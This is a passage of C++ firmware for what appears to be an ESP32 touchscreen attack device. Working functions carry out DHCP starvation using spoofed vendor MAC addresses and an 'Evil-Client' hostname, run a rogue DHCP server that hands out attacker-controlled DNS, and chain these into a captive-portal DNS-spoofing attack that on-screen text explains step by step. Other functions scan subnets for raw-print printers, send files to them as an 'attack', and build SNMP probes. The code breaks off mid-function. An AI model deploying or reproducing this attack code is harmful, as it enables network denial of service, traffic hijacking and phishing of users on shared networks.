    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Error: Failed to init \nUDP socket");

    delay(2000);
    return;
  }

  Serial.println("System initialized. Ready to detect DHCP server...");
  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 0);
  tft.println("System initialized");
  tft.println("Starting DHCP detection...");

  delay(1000);

  detectDHCPServer();
  if (dhcpServerDetected) {
    Serial.println("DHCP server detected. Starting DHCP Starvation attack...");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Starvation running on:");
    tft.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());

  } else {
    Serial.println("No DHCP server detected. Trying with broadcast.");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Starvation running on:");
    tft.printf("Unknow DHCP server");

  }

  uint16_t i = 0;
  while (nakCount < NAKNumberStarvation) {


    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
      Serial.println("Attack stopped by user");
      tft.println("Attack stopped");

      delay(1000);
      break;
    }

    generateRandomMAC(macBase, i); // Generate random MAC address
    completeDHCPTransaction(macBase); // Perform complete DHCP transaction

    float progress = (float)ackCount / totalIPs;
    percentage = (int)(progress * 100.0);
    // Update display with statistics
    tft.fillRect(0, 50, tft.width(), 50, menuBackgroundColor);
    tft.setCursor(0, 50);
    tft.printf("Pool percentage: %d%%\n", percentage);
    tft.printf("Send Discover: %d\n", discoverCount);
    tft.printf("Received Offer: %d\n", offerCount);
    tft.printf("Send Request: %d\n", requestCount);
    tft.printf("Received ACK: %d\n", ackCount);
    tft.printf("Received NAK: %d\n", nakCount);
    tft.print("Last IP:");
    tft.print(lastAssignedIP.toString().c_str());
    tft.print("        ");
    i++;
  }
  if (nakCount >= NAKNumberStarvation ) {
    Serial.println("The number of NAK suggest a successfull Starvation.");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 30);
    tft.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");

    delay(4000);
  }
  Serial.println("DHCP Starvation attack completed.");
  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 30);
  tft.println("DHCP Starvation Stopped.");
  tft.printf("Pool percentage: %d%%\n", percentage);
  tft.printf("Total Discover: %d\n", discoverCount);
  tft.printf("Total Offer: %d\n", offerCount);
  tft.printf("Total Request: %d\n", requestCount);
  tft.printf("Total ACK: %d\n", ackCount);
  tft.printf("Total NAK: %d\n", nakCount);

  delay(4000);
  waitAndReturnToMenu("Return to menu");
}

const uint8_t knownOUI[][3] = {
  {0x00, 0x1A, 0x2B}, // Cisco
  {0x00, 0x1B, 0x63}, // Apple
  {0x00, 0x1C, 0x4D}, // Intel
  {0xAC, 0xDE, 0x48}, // Broadcom
  {0xD8, 0x3C, 0x69}, // Huawei
  {0x3C, 0xA0, 0x67}, // Samsung
  {0xB4, 0x86, 0x55}, // Xiaomi
  {0xF4, 0x28, 0x53}, // TP-Link
  {0x00, 0x25, 0x9C}, // Dell
  {0x00, 0x16, 0xEA}, // LG Electronics
  {0x00, 0x1E, 0xC2}, // Sony
  {0x50, 0xCC, 0xF8}, // Microsoft
  {0x00, 0x24, 0xE8}, // ASUS
  {0x88, 0x32, 0x9B}, // Hewlett Packard
  {0x00, 0x26, 0xBB}, // Lenovo
  {0x78, 0xD7, 0xF7}, // Realtek Semiconductor
  {0xBC, 0x92, 0x6B}, // Xiaomi Communications
  {0x84, 0xA8, 0xE4}, // OnePlus Technology
  {0xD4, 0x25, 0x8B}, // Oppo Mobile
  {0x8C, 0x5A, 0xF0}, // Amazon Technologies
  {0xAC, 0x3C, 0x0B}, // Google
  {0x00, 0x17, 0xF2}, // Philips Lighting
  {0x00, 0x1D, 0x7E}, // Motorola
  {0xF8, 0x16, 0x54}, // ZTE Corporation
  {0xE8, 0x94, 0xF6}, // Vivo Mobile
  {0xF4, 0x09, 0xD8}, // Netgear
  {0x00, 0x0F, 0xB5}, // Buffalo
  {0x40, 0x16, 0x7E}, // PlayStation
  {0x68, 0x5B, 0x35}, // Nintendo
  {0xF4, 0x6D, 0x04}, // Fitbit
  {0x00, 0x1E, 0x3D}, // Blackberry
  {0x24, 0xD4, 0x42}, // Razer
  {0x4C, 0x32, 0x75}, // Logitech
  {0x74, 0x83, 0xEF}, // Roku
  {0x28, 0xA1, 0x83}, // Alienware (Dell)
  {0xB8, 0x27, 0xEB}, // Raspberry Pi Foundation
  {0x44, 0x65, 0x0D}, // Aruba Networks
  {0x38, 0xFF, 0x36}, // Juniper Networks
  {0x00, 0x23, 0x6C}  // Panasonic
};

void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
  // Select random OUI
  uint8_t index = random(0, sizeof(knownOUI) / sizeof(knownOUI[0]));
  mac[0] = knownOUI[index][0];
  mac[1] = knownOUI[index][1];
  mac[2] = knownOUI[index][2];

  // Generate last 3 bytes randomly
  mac[3] = random(0x00, 0xFF);
  mac[4] = random(0x00, 0xFF);
  mac[5] = random(0x00, 0xFF);
}

const char* fixedHostname = "Evil-Client";

void sendDHCPDiscover(uint8_t *mac) {
  uint8_t dhcpDiscover[300] = {0};
  int index = 0;

  // Ethernet Header
  dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
  dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
  dhcpDiscover[index++] = 0x06; // HLEN: MAC address length
  dhcpDiscover[index++] = 0x00; // HOPS: 0

  // Transaction ID
  uint32_t xid = random(1, 0xFFFFFFFF); // Ensure xid is not zero
  dhcpDiscover[index++] = (xid >> 24) & 0xFF;
  dhcpDiscover[index++] = (xid >> 16) & 0xFF;
  dhcpDiscover[index++] = (xid >> 8) & 0xFF;
  dhcpDiscover[index++] = xid & 0xFF;

  // Seconds and Flags
  dhcpDiscover[index++] = 0x00; // Seconds
  dhcpDiscover[index++] = 0x00;
  dhcpDiscover[index++] = 0x80; // Flags (Broadcast)
  dhcpDiscover[index++] = 0x00;

  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
  for (int i = 0; i < 16; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // Client MAC Address (chaddr)
  for (int i = 0; i < 6; i++) {
    dhcpDiscover[index++] = mac[i];
  }
  for (int i = 0; i < 10; i++) {
    dhcpDiscover[index++] = 0x00; // Padding to make chaddr 16 bytes
  }

  // sname: Server Host Name (64 bytes)
  for (int i = 0; i < 64; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // file: Boot File Name (128 bytes)
  for (int i = 0; i < 128; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // DHCP Magic Cookie
  dhcpDiscover[index++] = 0x63;
  dhcpDiscover[index++] = 0x82;
  dhcpDiscover[index++] = 0x53;
  dhcpDiscover[index++] = 0x63;

  // DHCP Options
  dhcpDiscover[index++] = 53; // DHCP Message Type Option
  dhcpDiscover[index++] = 1;  // Length
  dhcpDiscover[index++] = 1;  // DHCP Discover

  // Host Name Option (12)
  dhcpDiscover[index++] = 12;               // Option 12: Host Name
  dhcpDiscover[index++] = strlen(fixedHostname); // Length of the host name
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpDiscover[index++] = fixedHostname[i];  // Add the host name characters
  }


  dhcpDiscover[index++] = 55; // Parameter Request List
  dhcpDiscover[index++] = 4;  // Length
  dhcpDiscover[index++] = 1;  // Subnet Mask
  dhcpDiscover[index++] = 3;  // Router
  dhcpDiscover[index++] = 6;  // DNS Server
  dhcpDiscover[index++] = 15; // Domain Name
  dhcpDiscover[index++] = 255; // End Option

  // Send the packet
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpDiscover, index);
    udp.endPacket();
    discoverCount++;
    Serial.println("Sent DHCP Discover with Host Name...");
  } else {
    Serial.println("Failed to send DHCP Discover.");
    tft.setCursor(0, tft.height() - 40);
    tft.println("Failed to send DHCP Discover");

  }
}

void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
  uint8_t dhcpRequest[300] = {0};
  int index = 0;

  // Ethernet Header
  dhcpRequest[index++] = 0x01; // OP: BOOTREQUEST
  dhcpRequest[index++] = 0x01; // HTYPE: Ethernet
  dhcpRequest[index++] = 0x06; // HLEN: MAC address length
  dhcpRequest[index++] = 0x00; // HOPS: 0

  // Transaction ID
  uint32_t xid = random(1, 0xFFFFFFFF); // Unique transaction ID
  dhcpRequest[index++] = (xid >> 24) & 0xFF;
  dhcpRequest[index++] = (xid >> 16) & 0xFF;
  dhcpRequest[index++] = (xid >> 8) & 0xFF;
  dhcpRequest[index++] = xid & 0xFF;

  // Seconds and Flags
  dhcpRequest[index++] = 0x00; // Seconds
  dhcpRequest[index++] = 0x00;
  dhcpRequest[index++] = 0x80; // Flags (Broadcast)
  dhcpRequest[index++] = 0x00;

  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
  for (int i = 0; i < 16; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // Client MAC Address (chaddr)
  for (int i = 0; i < 6; i++) {
    dhcpRequest[index++] = mac[i];
  }
  for (int i = 0; i < 10; i++) {
    dhcpRequest[index++] = 0x00; // Padding to make chaddr 16 bytes
  }

  // sname: Server Host Name (64 bytes)
  for (int i = 0; i < 64; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // file: Boot File Name (128 bytes)
  for (int i = 0; i < 128; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // DHCP Magic Cookie
  dhcpRequest[index++] = 0x63;
  dhcpRequest[index++] = 0x82;
  dhcpRequest[index++] = 0x53;
  dhcpRequest[index++] = 0x63;

  // DHCP Options
  dhcpRequest[index++] = 53; // DHCP Message Type Option
  dhcpRequest[index++] = 1;  // Length
  dhcpRequest[index++] = 3;  // DHCP Request

  // Requested IP Address Option
  dhcpRequest[index++] = 50; // Requested IP Address
  dhcpRequest[index++] = 4;  // Length
  dhcpRequest[index++] = offeredIP[0];
  dhcpRequest[index++] = offeredIP[1];
  dhcpRequest[index++] = offeredIP[2];
  dhcpRequest[index++] = offeredIP[3];

  // DHCP Server Identifier Option
  dhcpRequest[index++] = 54; // DHCP Server Identifier
  dhcpRequest[index++] = 4;  // Length
  dhcpRequest[index++] = dhcpServerIP[0];
  dhcpRequest[index++] = dhcpServerIP[1];
  dhcpRequest[index++] = dhcpServerIP[2];
  dhcpRequest[index++] = dhcpServerIP[3];

  // Host Name Option (12)
  dhcpRequest[index++] = 12;               // Option 12: Host Name
  dhcpRequest[index++] = strlen(fixedHostname); // Length of the host name
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpRequest[index++] = fixedHostname[i];  // Add the host name characters
  }

  dhcpRequest[index++] = 255; // End Option

  // Send the packet
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpRequest, index);
    udp.endPacket();
    requestCount++;
    Serial.println("Sent DHCP Request with Host Name...");
  } else {
    Serial.println("Failed to send DHCP Request.");
    tft.setCursor(0, tft.height() - 40);
    tft.println("Failed to send DHCP Request");

  }
}

// Complete DHCP Transaction
void completeDHCPTransaction(uint8_t *mac) {
  sendDHCPDiscover(mac);
  Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");

  unsigned long offerWaitStart = millis();
  while (millis() - offerWaitStart < 2000) {
    int packetSize = udp.parsePacket();
    if (packetSize > 0) {
      uint8_t packetBuffer[512];
      udp.read(packetBuffer, packetSize);

      uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
      if (messageType == 6) { // DHCP NAK
        nakCount++;
        Serial.println("Received DHCP NAK");
        return;
      } else if (messageType == 2) { // DHCP Offer
        offerCount++;
        IPAddress offeredIP(packetBuffer[16], packetBuffer[17], packetBuffer[18], packetBuffer[19]);
        Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
        lastAssignedIP = offeredIP;

        sendDHCPRequest(mac, offeredIP, dhcpServerIP);

        unsigned long ackWaitStart = millis();
        while (millis() - ackWaitStart < 2000) {
          int ackPacketSize = udp.parsePacket();
          if (ackPacketSize > 0) {
            udp.read(packetBuffer, ackPacketSize);

            uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackPacketSize);
            if (ackMessageType == 5) { // DHCP ACK
              ackCount++;
              Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
              return;
            } else if (ackMessageType == 6) { // DHCP NAK
              nakCount++;
              Serial.println("Received DHCP NAK");
              return;
            }
          }
        }
        Serial.println("No DHCP ACK received.");
        return;
      }
    }
  }
  Serial.println("No DHCP Offer received.");
}

// DHCP packet analysis
uint8_t parseDHCPMessageType(uint8_t *packet, int packetSize) {
  if (packetSize < 244 || packet[236] != 0x63 || packet[237] != 0x82 || packet[238] != 0x53 || packet[239] != 0x63) {
    return 0; // Not a DHCP packet
  }
  for (int i = 240; i < packetSize; i++) {
    if (packet[i] == 53 && packet[i + 1] == 1) {
      return packet[i + 2];
    }
  }
  return 0;
}

void switchDNS() {
  ipAP = WiFi.softAPIP();
  ipSTA = WiFi.localIP();
  dnsServer.stop();  // Stop the current DNS server
  useAP = !useAP;    // Toggle between AP and STA modes
  IPAddress newIP = useAP ? ipAP : ipSTA;
  dnsServer.start(DNS_PORT, "*", newIP);  // Restart the DNS server with the new IP
  Serial.print("DNS restarted with IP: ");
  Serial.println(newIP);

  // Build the message with the current DNS IP
  String message = "DNS reset, new IP: \n" + newIP.toString();
  waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
}


void rogueDHCPAuto() {
  rogueIPRogue = WiFi.localIP();
  currentSubnetRogue = WiFi.subnetMask();
  currentGatewayRogue = WiFi.localIP();
  currentDNSRogue = WiFi.localIP();

  udp.begin(localUdpPort);

  tft.fillScreen(menuBackgroundColor);
  Serial.println("Rogue DHCP running...");
  updateDisplay("DHCP running...");

  unsigned long startTime = millis(); // Enregistrer le temps de début

  while (millis() - startTime < 15000) { // Boucle pendant 15 secondes


    handleDnsRequestSerial();

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);

      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println("DHCP Discover received. Preparing Offer...");
        updateDisplay("Discover. Preparing Offer...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer

        // Send the DHCP Offer
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP Offer sent.");
        updateDisplay("Offer sent.");

      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println("DHCP Request received. Preparing ACK...");
        updateDisplay("Request. Preparing ACK...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK

        // Send the DHCP ACK
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP ACK sent.");
        updateDisplay("ACK sent.");
      }
    }
  }
  updateDisplay("Rogue DHCP stopped.");
}


void DHCPAttackAuto() {
  bool DHCPDNSExplain = false;
  if (confirmPopup("Some explanation ?")) {
    DHCPDNSExplain = true;
  }
  if (DHCPDNSExplain) {
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 20);
    tft.println("Step 1 : DHCP Starvation.");
    tft.println("Send multiple fake new");
    tft.println("client to saturate the");
    tft.println("the pool of available");
    tft.println("IP address that DHCP can");
    tft.println("provide. NAK = Starvation");
    tft.println("Press Enter to start");

    while (true) {
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
        break;
      }
      delay(100);
    }
  }
  startDHCPStarvation();
  screenDebounce();
  if (DHCPDNSExplain) {
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 20);
    tft.println("Step 2 : Rogue DHCP.");
    tft.println("The Original DHCP cant");
    tft.println("provide new IP so we");
    tft.println("now answering any DHCP");
    tft.println("request with hijacked");
    tft.println("DNS that at evil IP.");
    tft.println("Press Enter to start");

    while (true) {
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
        break;
      }
      delay(100);
    }
  }
  rogueDHCPAuto();
  screenDebounce();
  if (DHCPDNSExplain) {
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 20);
    tft.println("Step 3 : Start the Web");
    tft.println("server with DNS Spoofing.");
    tft.println("Start the portal to");
    tft.println("provide page and DNS.");
    tft.println("The DNS spoof any request");
    tft.println("to redirect to the evil.");
    tft.println("Press Enter to start");

    while (true) {
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
        break;
      }
      delay(100);
    }
  }
  createCaptivePortal();
  screenDebounce();
  if (DHCPDNSExplain) {
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 20);
    tft.println("Step 4 : Change DNS IP.");
    tft.println("Changing DNS IP with");
    tft.println("local IP address to");
    tft.println("provide Spoffed DNS query.");
    tft.println("Press Enter to change");

    while (true) {
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
        break;
      }
      delay(100);
    }
  }
  switchDNS();
}






// Global vector for detected printers
std::vector<IPAddress> detectedPrinters;

// Checks if a host is a printer (port 9100 open)
bool isPrinter(IPAddress ip, uint32_t timeout_ms = 150) {
  WiFiClient client; // Instance of WiFiClient
  Serial.printf("[TEST] Checking IP: %s for printer on port 9100\n", ip.toString().c_str());

  if (connectWithTimeout(client, ip, 9100, timeout_ms)) {
    Serial.printf("[INFO] Printer detected at IP: %s\n", ip.toString().c_str());
    client.stop(); // Close the connection properly
    return true;
  } else {
    Serial.printf("[INFO] No printer found at IP: %s\n", ip.toString().c_str());
    return false;
  }
}

bool validateBaseIP(const String& baseIP) {
  int dotCount = 0;
  for (char c : baseIP) {
    if (c == '.') dotCount++;
    else if (!isDigit(c)) return false;
  }
  return dotCount == 2; // Ensures "192.168.1" contains only two dots
}

String getNetworkBase() {
  String baseIP = "";
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1.5);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(0, 0);
  tft.println("Enter base IP (192.168.1)");
  tft.println("Or ok for current net<ork");
  tft.setCursor(0, 50);
  delay(2000);
  while (true) {
    baseIP = getUserInput();

    // If the user enters "ok", use the current network IP
    if (baseIP == "ok") {
      IPAddress currentIP = WiFi.localIP();
      char fallbackIP[16];
      sprintf(fallbackIP, "%d.%d.%d", currentIP[0], currentIP[1], currentIP[2]);
      return String(fallbackIP);
    }

    // Validate partial IP address format
    if (validateBaseIP(baseIP)) {
      return baseIP;
    } else {
      tft.setCursor(0, 80);
      tft.println("Invalid format! Retry.");
      delay(2000);
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0, 0);
      tft.println("Enter base IP (192.168.1):");
    }
  }
}

void detectPrinter() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println("[INFO] Not connected to a network.");
    waitAndReturnToMenu("Not connected to a network.");
    return;
  }

  // Get the base network IP
  String baseIP = getNetworkBase();
  char base_ip[16];
  sprintf(base_ip, "%s.", baseIP.c_str());

  Serial.println("[INFO] Network base IP: " + String(base_ip));
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 20);
  tft.println("Scanning for printers...");


  detectedPrinters.clear();

  // Scan subnet IP addresses
  for (int i = 1; i <= 254; i++) {
    IPAddress currentIP;
    sscanf(base_ip, "%d.%d.%d.", &currentIP[0], &currentIP[1], &currentIP[2]);
    currentIP[3] = i;

    Serial.printf("[DEBUG] Checking IP: %s\n", currentIP.toString().c_str());

    // Check directly for port 9100 with a 100ms timeout
    if (isPrinter(currentIP, 100)) {
      detectedPrinters.push_back(currentIP);
      Serial.printf("[INFO] Printer detected: %s\n", currentIP.toString().c_str());
    }

    // Progress update
    if (i % 10 == 0) {
      tft.setCursor(0, 40);
      tft.printf("Scanned %d/254 IPs...\n", i);

    }
  }

  // Final result
  tft.fillScreen(TFT_BLACK);
  if (detectedPrinters.empty()) {
    tft.setCursor(0, 20);
    tft.println("No printers detected.");
    tft.println("Returning to menu...");

    Serial.println("[INFO] No printers detected.");
  } else {
    tft.setCursor(0, 20);
    tft.println("Printers found:");
    for (const auto &printerIP : detectedPrinters) {
      Serial.println(" - " + printerIP.toString());
      tft.println(printerIP.toString());
    }

  }

  delay(2000);
  waitAndReturnToMenu("return to menu");
}

void printFile() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println("[INFO] Not connected to a network.");
    waitAndReturnToMenu("Not connected to a network.");
    return;
  }
  // File path to print and printer IP configuration
  String filePath = "/Printer/File-To-Print.txt"; // Replace with your file
  String printerConfigPath = "/Printer/PrinterIp.txt";

  std::vector<IPAddress> printerIPs;

  // Check for necessary files
  if (!SD.exists(filePath)) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 20);
    tft.println("File not found:");
    tft.println(filePath);
    waitAndReturnToMenu("return to menu");
    return;
  }

  if (!SD.exists(printerConfigPath)) {
    Serial.println("Printer configuration file not found.");
  }

  // Open printer configuration file
  File config = SD.open(printerConfigPath);
  if (config) {
    while (config.available()) {
      String line = config.readStringUntil('\n');
      line.trim(); // Removes whitespace and newlines
      if (line.length() > 0) {
        IPAddress ip;
        if (ip.fromString(line)) {
          printerIPs.push_back(ip);
        } else {
          Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
        }
      }
    }
    config.close();
  }

  // If the file is empty, use detected printers
  if (printerIPs.empty()) {
    printerIPs = detectedPrinters;
  }

  // Check if there are printers to process
  if (printerIPs.empty()) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 20);
    tft.println("No printers detected");
    tft.println("or configured.");
    tft.println("Returning to menu...");

    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Confirm operation with the user
  String message = "Attack " + String(printerIPs.size()) + " printers?";
  if (!confirmPopup(message)) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 20);
    tft.println("Operation cancelled by user.");

    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Open the file to print
  File file = SD.open(filePath);
  if (!file) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 20);
    tft.println("Failed to open file:");
    tft.println(filePath);
    tft.println("Returning to menu...");

    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Send the file to each printer
  for (IPAddress printerIP : printerIPs) {
    WiFiClient client;

    // Connect to the printer on port 9100
    if (!client.connect(printerIP, 9100)) {
      Serial.printf("Failed to connect to printer: %s\n", printerIP.toString().c_str());
      continue;
    }

    // Display current status on the screen
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 20);
    tft.println("Printing to:");
    tft.println(printerIP.toString());

    delay(200);

    // Reset file position
    file.seek(0);

    // Read the file and send its content to the printer
    while (file.available()) {
      String line = file.readStringUntil('\n'); // Read line by line
      client.println(line);                     // Send to the printer
    }

    client.stop();
    Serial.printf("Print job completed for printer: %s\n", printerIP.toString().c_str());
  }

  file.close();

  // Confirm operation completion
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 20);
  tft.println("Print job completed");
  tft.println("on all printers!");

  delay(2000);
  waitAndReturnToMenu("return to menu");
}



// Define the SNMP community and port
#define SNMP_PORT 161
#define SNMP_COMMUNITY "public"

// Function to encode an OID into BER format
int encodeOID(const char* oidStr, uint8_t* outBuffer, size_t outSize) {
  std::vector<int> parts;
  char temp[64];
  strncpy(temp, oidStr, sizeof(temp) - 1);
  temp[sizeof(temp) - 1] = '\0';

  char* token = strtok(temp, ".");
  while (token) {
    parts.push_back(atoi(token));
    token = strtok(nullptr, ".");
  }

  if (parts.size() < 2) return -1; // Invalid OID

  int pos = 0;
  outBuffer[pos++] = (uint8_t)(parts[0] * 40 + parts[1]);

  for (size_t i = 2; i < parts.size(); i++) {
    int val = parts[i];
    if (val < 128) {
      outBuffer[pos++] = (uint8_t)val;
    } else {
      return -1; // Simplified: no multi-byte support
    }
    if (pos >= (int)outSize) return -1;
  }
  return pos;
}


bool parseSNMPResponse(const uint8_t* buffer, size_t bufferLen, String &outValue) {
  // Keep an index that moves through buffer
  size_t index = 0;

  // 1) Expect top-level SEQUENCE (0x30)
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Not a SEQUENCE at top-level.");
    return false;
  }
  // Read length
  uint8_t snmpMsgLength = buffer[index++];

  // 2) Read version INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected version INTEGER tag.");
    return false;
  }
  uint8_t versionLength = buffer[index++];
  // Skip the version bytes
  index += versionLength;

  // 3) Read community OCTET STRING
  if (buffer[index++] != 0x04) {
    Serial.println("[ERROR] Expected community OCTET STRING tag.");
    return false;
  }
  uint8_t communityLength = buffer[index++];
  // Skip the community bytes
  index += communityLength;

  // 4) Read PDU type (0xA2 for Get-Response)
  uint8_t pduType = buffer[index++];
  if (pduType != 0xA2) {
    Serial.printf("[WARN] Unexpected PDU type: 0x%02X\n", pduType);
  }
  uint8_t pduLength = buffer[index++];

  // 5) Read request-id INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected request-id INTEGER tag.");
    return false;
  }
  uint8_t ridLength = buffer[index++];
  index += ridLength; // skip request id bytes

  // 6) Read error-status INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected error-status INTEGER tag.");
    return false;
  }
  uint8_t errStatusLen = buffer[index++];
  index += errStatusLen; // skip error status

  // 7) Read error-index INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected error-index INTEGER tag.");
    return false;
  }
  uint8_t errIndexLen = buffer[index++];
  index += errIndexLen; // skip error index

  // 8) Read variable-bindings SEQUENCE
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Expected VarBind list SEQUENCE (0x30).");
    return false;
  }
  uint8_t vbListLength = buffer[index++];

  // 9) Read first VarBind SEQUENCE
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Expected single VarBind SEQUENCE (0x30).");
    return false;
  }
  uint8_t vbLength = buffer[index++];

  // 10) Read the OID
  if (buffer[index++] != 0x06) {
    Serial.println("[ERROR] Expected OID tag (0x06).");
    return false;
  }
  uint8_t oidLength = buffer[index++];
  // skip the OID bytes
  index += oidLength;

  // 11) Now read the Value portion
  uint8_t valueTag = buffer[index++];
  uint8_t valueLen = buffer[index++];

  if (valueTag == 0x04) {
    // OCTET STRING
    // Copy out the next valueLen bytes as text
    char temp[128];
    if (valueLen >= sizeof(temp)) valueLen = sizeof(temp) - 1;
    memcpy(temp, &buffer[index], valueLen);
    temp[valueLen] = '\0';
    outValue = String(temp);
  }
  else if (valueTag == 0x02) {
    // INTEGER
    if (valueLen == 1) {
      int val = buffer[index];
      outValue = String(val);
    } else {
      // For simplicity, handle only 1-byte integers in this example
      outValue = F("[Unsupported multi-byte INTEGER]");
    }
  }
  else if (valueTag == 0x43) {
    // TIME TICKS
    // Usually 4 bytes, big-endian
    if (valueLen == 4) {
      uint32_t ticks =
        (uint32_t)buffer[index] << 24 |
        (uint32_t)buffer[index + 1] << 16 |
        (uint32_t)buffer[index + 2] <<  8 |
        (uint32_t)buffer[index + 3];
      // Convert ticks (1/100s) to some readable format
      // E.g., "1d 10:20:30" etc.
      outValue = String(ticks) + " (raw ticks)";
    } else {
      outValue = F("[Unsupported TIME TICKS length]");
    }
  }
  else {
    // For any other tag
    outValue = F("[Unhandled data type]");
  }

  // Advance index by valueLen
  index += valueLen;

  return true;
}


// Function to send an SNMP GET request
bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
  uint8_t packet[100];
  int pos = 0;

  // SNMP header
  packet[pos++] = 0x30; // Sequence
  int lengthPos = pos++;

  // Version
  packet[pos++] = 0x02; // Integer
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // SNMP version 1

  // Community
  packet[pos++] = 0x04; // Octet string
  packet[pos++] = strlen(SNMP_COMMUNITY);
  memcpy(&packet[pos], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
  pos += strlen(SNMP_COMMUNITY);

  // PDU header
  packet[pos++] = 0xA0; // GET Request
  int pduLengthPos = pos++;

  packet[pos++] = 0x02; // Integer (request ID)
  packet[pos++] = 0x01;
  packet[pos++] = 0x01; // Request ID = 1

  packet[pos++] = 0x02; // Integer (error status)
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // No error

  packet[pos++] = 0x02; // Integer (error index)
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // No error

  // Variable bindings
  packet[pos++] = 0x30; // SEQUENCE (Variable-binding structure)
  int vbSequenceLengthPos = pos++; // Placeholder for the length of the entire variable-binding sequence

  // Single variable-binding
  packet[pos++] = 0x30; // SEQUENCE (Single variable-binding)
